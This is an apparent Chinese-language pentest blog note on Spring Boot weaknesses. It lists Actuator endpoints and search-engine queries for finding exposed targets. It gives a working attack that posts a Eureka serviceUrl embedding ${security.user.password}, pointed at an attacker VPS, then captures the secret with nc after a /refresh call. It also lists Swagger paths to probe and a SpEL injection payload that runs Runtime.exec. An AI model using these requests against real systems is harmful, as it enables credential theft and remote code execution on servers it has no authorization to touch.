---
title: SpringBoot各组件及版本漏洞
date: 2025-04-14
updated: 2025-04-14
tags:
  - 服务组件框架漏洞
  - Java安全
categories:
  - 安全相关
description: SpringBoot各组件及版本漏洞
published: false
---
## Actuator

Spring Boot 中提供健康检测、度量信息和环境信息监控的组件

常见端点信息

- Spring Boot 1.x 版本默认内置路由的根路径以 / 开始
- Spring Boot 2.x 版本则统一以 /actuator 开始
- 有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径
- Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成/appenv

| 路径 | 描述 |
| --- | --- |
| /autoconfig | 提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过 |
| /beans | 描述应用程序上下文里全部的 Bean，以及它们的关系 |
|  /env | 获取全部环境属性 |
| /configprops | 描述配置属性(包含默认值)如何注入 Bean |
|  /dump | 获取线程活动的快照 |
| /health | 报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供 |
| /info | 获取应用程序的定制信息，这些信息由 info 打头的属性提供 |
| /mappings | 描述全部的 URI 路径，以及它们和控制器(包含 Actuator 端点)的映射关系 |
| /metrics | 报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数 |
| /shutdown | 关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true |
|  /trace | 提供 HTTP 请求的跟踪信息，包括时间戳、请求头等。 |

fofa 语法

```
icon_hash="116323821" || body="Whitelabel Error Page"
```

zoomeye

```
app:"Spring Framework"
```

hunter

```
app.name="Spring Whitelabel Error"
```

访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果

### 利用条件

- 可以 GET 请求目标网站的 /env
- 可以 POST 请求目标网站的 /env
- 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依
- 赖）
- 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖
- 目标可以请求攻击者的服务器（请求可出外网）

### 利用方式

找到被 `*****` 掩盖的属性值对应的属性名，nc 监听

设置 eureka.client.serviceUrl.defaultZone 属性

```
POST /env

Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
```

刷新配置

```
POST /refresh

Content-Type: application/x-www-form-urlencoded
```

nc 收到目标发来的请求，解码对应的属性值（一般 base64）

## Swagger

接口路由

```
/v2/api-docs
/swagger-ui.html

/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

## whitelabel error page SpEL RCE

当 Spring Boot 应用抛出未处理的异常（如参数解析错误、404 页面等），会进入默认的 Whitelabel Error Page。

- 如果错误信息中包含 `${...}` 格式的字符串，Spring Boot 会调用 `PropertyPlaceholderHelper.parseStringValue()` 方法递归解析。
- 解析过程中，`${...}` 内的内容会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行（而非简单的占位符替换）。

攻击者通过请求参数（如 `?error=${T(java.lang.Runtime).getRuntime().exec("calc")}`）注入 SpEL 表达式。

Spring Boot 在渲染错误页面时，未对表达式内容过滤，直接执行恶意代码。

